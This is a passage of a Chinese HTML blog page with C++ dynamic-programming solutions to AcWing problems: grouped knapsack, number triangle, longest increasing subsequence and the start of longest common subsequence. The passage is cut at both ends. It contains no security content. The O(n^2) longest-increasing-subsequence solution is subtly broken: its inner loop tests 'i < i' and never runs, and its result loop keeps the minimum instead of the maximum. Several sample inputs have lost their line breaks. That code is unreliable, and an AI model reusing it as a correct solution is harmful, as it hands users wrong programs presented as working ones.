class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">ij</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>输入样例</strong></p><pre><code>3 521 22 413 414 5</code></pre><p><strong>输出样例：</strong></p><pre><code>8</code></pre><h3 id="一维dp数组-2">一维dp数组</h3><ul><li>状态计算 <code>f[i][j] = f[i - 1][j - v[i][k]] + w[i][k]</code><ul><li>按照i组物品选不选、选第几个进行分类</li><li>不选 <code>f[i - 1][j]</code></li><li>选第k个 <code>f[i - 1][j - v[i][k]] + w[i][k], k = 1,2,..,si</code></li></ul></li></ul><p>使用<code>i-1</code>层信息，改进为一维后，体积从大到小循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">110</span>, kM = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, s[kN], v[kN][kM], w[kN][kM];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s[i]; k++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i][k], &amp;w[i][k]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s[i]; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= v[i][k]) &#123;</span><br><span class="line">          <span class="comment">// 最开始的f[j]就是f[i - 1][j], 即包含不选第i组物品的情况</span></span><br><span class="line">          f[j] = <span class="built_in">max</span>(f[j], f[j - v[i][k]] + w[i][k]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="边处理边计算">边处理边计算</h3><p>体积和价值数组可以从二维降为一维。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kM = <span class="number">110</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kM], w[kM];</span><br><span class="line"><span class="type">int</span> f[kM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="type">int</span> s;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s; k++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[k], &amp;w[k]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= s; k++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= v[k]) &#123;  <span class="comment">// 一定要记得判断喔</span></span><br><span class="line">          f[j] = <span class="built_in">max</span>(f[j], f[j - v[k]] + w[k]);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线性DP">线性DP</h1><h2 id="AcWing-898-数字三角形"><a href="https://www.acwing.com/problem/content/900/">AcWing 898. 数字三角形  </a></h2><p><code>难度：简单</code></p><p>给定一个如下图所示的数字三角形，从顶部出发，在每一结点可以选择移动至其左下方的结点或移动至其右下方的结点，一直走到底层，要求找出一条路径，使路径上的数字的和最大。</p><pre><code>        7      3   8    8   1   0  2   7   4   44   5   2   6   5</code></pre><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，表示数字三角形的层数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行，每行包含若干整数，其中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 行表示数字三角形第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> 层包含的整数。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大的路径数字和。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>500</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 500</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">500</span></span></span></span>,<br>\-10000 \le 三角形中的整数 \le 10000</p><p><strong>输入样例：</strong></p><pre><code>573 88 1 0 2 7 4 44 5 2 6 5</code></pre><p><strong>输出样例：</strong></p><pre><code>30</code></pre><h3 id="算法1-自顶向下动态规划">算法1 自顶向下动态规划</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">510</span>, kINF = <span class="number">1e9</span>;</span><br><span class="line"><span class="type">int</span> n, a[kN][kN], f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">          <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i][j]);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i + <span class="number">1</span>; j++) &#123;  <span class="comment">// 状态计算时会用到f[i,0], f[i,i+1]</span></span><br><span class="line">          f[i][j] = -kINF;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  f[<span class="number">1</span>][<span class="number">1</span>] = a[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">          f[i][j] = <span class="built_in">max</span>(f[i - <span class="number">1</span>][j - <span class="number">1</span>], f[i - <span class="number">1</span>][j]) + a[i][j];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> res = -kINF;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (f[n][i] &gt; res) &#123;</span><br><span class="line">          res = f[n][i];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="算法2-自底向上动态规划">算法2 自底向上动态规划</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">510</span>;</span><br><span class="line"><span class="type">int</span> n, f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">          <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = i; j &gt;= <span class="number">1</span>; j--) &#123;</span><br><span class="line">          f[i][j] = <span class="built_in">max</span>(f[i + <span class="number">1</span>][j], f[i + <span class="number">1</span>][j + <span class="number">1</span>]) + f[i][j];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-895-最长上升子序列"><a href="https://www.acwing.com/problem/content/897/">AcWing 895. 最长上升子序列</a></h2><p><code>难度：简单</code></p><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 的数列，求数值严格单调递增的子序列的长度最长是多少。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个整数，表示完整序列。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大长度。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>，<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>≤</mo><mtext>数列中的数</mtext><mo>≤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le 数列中的数 \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord cjk_fallback">数列中的数</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>73 1 2 1 8 5 6</code></pre><p><strong>输出样例：</strong></p><pre><code>4</code></pre><h3 id="DP">DP</h3><ul><li>状态表示<code>f[i]</code><ul><li>集合：所有以第i个数结尾的上升子序列</li><li>属性：MAX(序列最大长度)</li></ul></li><li>状态计算<ul><li>以倒数第2个数在一位进行分类</li><li><code>f[i] = max(f[j] + 1), a[j] &lt; a[i], j = 0,1,...,i-1</code></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, a[kN], f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      f[i] = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; i &lt; i; j++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (a[j] &lt; a[i]) &#123;</span><br><span class="line">              f[i] = <span class="built_in">max</span>(f[i], f[j] + <span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (res &gt; f[i]) &#123;</span><br><span class="line">          res = f[i];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-896-最长上升子序列-II"><a href="https://www.acwing.com/problem/content/898/">AcWing 896. 最长上升子序列 II</a></h2><p>给定一个长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 的数列，求数值严格单调递增的子序列的长度最长是多少。</p><p><strong>输入格式</strong></p><p>第一行包含整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p>第二行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个整数，表示完整序列。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最大长度。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>100000</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 100000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100000</span></span></span></span>，<br>\-10^9 \le 数列中的数 \le 10^9</p><p><strong>输入样例：</strong></p><pre><code>73 1 2 1 8 5 6</code></pre><p><strong>输出样例：</strong></p><pre><code>4</code></pre><h3 id="贪心法">贪心法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n, a[kN];</span><br><span class="line"><span class="type">int</span> q[kN]; <span class="comment">// q[i]存放长度为i的递增序列的最后一位, q数组递增</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> len = <span class="number">0</span>; <span class="comment">// 当前已确定的最长递增序列长度</span></span><br><span class="line">  <span class="comment">// 二分法查找q数组中比a[i]小的最大元素</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>, r = len;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (q[mid] &lt; a[i]) l = mid;</span><br><span class="line">      <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len = <span class="built_in">max</span>(len, r + <span class="number">1</span>);</span><br><span class="line">    q[r + <span class="number">1</span>] = a[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, len);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-897-最长公共子序列"><a href="https://www.acwing.com/problem/content/899/">AcWing 897. 最长公共子序列</a></h2><p><code>难度：简单</code></p><p>给定两个长度分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 